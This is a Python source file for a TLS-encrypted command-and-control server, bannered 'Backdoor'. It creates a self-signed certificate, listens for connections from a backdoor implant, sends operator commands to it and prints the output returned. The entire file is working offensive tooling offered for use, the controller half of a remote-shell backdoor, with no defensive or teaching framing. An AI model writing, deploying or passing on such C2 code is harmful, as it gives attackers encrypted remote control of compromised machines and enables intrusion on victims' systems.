import socket
import ssl
import subprocess
import os

def generate_self_signed_cert(cert_file, key_file):
    """Generate a self-signed certificate and key."""
    cert_cmd = (
        f"openssl req -newkey rsa:2048 -nodes -keyout {key_file} -x509 "
        f"-days 365 -out {cert_file} -subj \"/C=US/ST=State/L=City/O=Organization/OU=OrgUnit/CN=localhost\""
    )
    subprocess.run(cert_cmd, shell=True, check=True)
    print(f"[+] Generated self-signed certificate: {cert_file} and key: {key_file}")

def start_c2_server(cert_file, key_file):
    print("""
  ____             _       _                  
 |  _ \\           | |     | |                 
 | |_) | __ _  ___| | ____| | ___   ___  _ __ 
 |  _ < / _` |/ __| |/ / _` |/ _ \\ / _ \\| '__|
 | |_) | (_| | (__|   < (_| | (_) | (_) | |   
 |____/ \\__,_|\\___|_|\\_\\__,_|\\___/ \\___/|_|   
                                              

""")

    host = input("Enter the IP address to listen on: ")
    port = int(input("Enter the port to listen on: "))

    # Create socket and wrap it with SSL
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)

    print("[+] Listening for connections...")

    # Wrap socket with SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert_file, keyfile=key_file)

    while True:
        client_socket, addr = server_socket.accept()
        ssl_client_socket = context.wrap_socket(client_socket, server_side=True)
        print(f"[+] Secure connection from {addr[0]}:{addr[1]}")

        # Send command to backdoor
        command = input("Enter command to send: ")
        ssl_client_socket.send(command.encode())

        # Receive output from backdoor
        output = b""
        while True:
            data = ssl_client_socket.recv(4096)
            if not data:
                break
            output += data

        print("[+] Binary output from backdoor:")
        try:
            print(output.decode())  # Try decoding as UTF-8
        except UnicodeDecodeError:
            print("[+] Output is not UTF-8 encoded:")
            print(output)

        ssl_client_socket.close()

if __name__ == "__main__":
    CERT_FILE = "server.crt"
    KEY_FILE = "server.key"

    # Generate self-signed certificate if it does not exist
    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
        generate_self_signed_cert(CERT_FILE, KEY_FILE)

    start_c2_server(CERT_FILE, KEY_FILE)

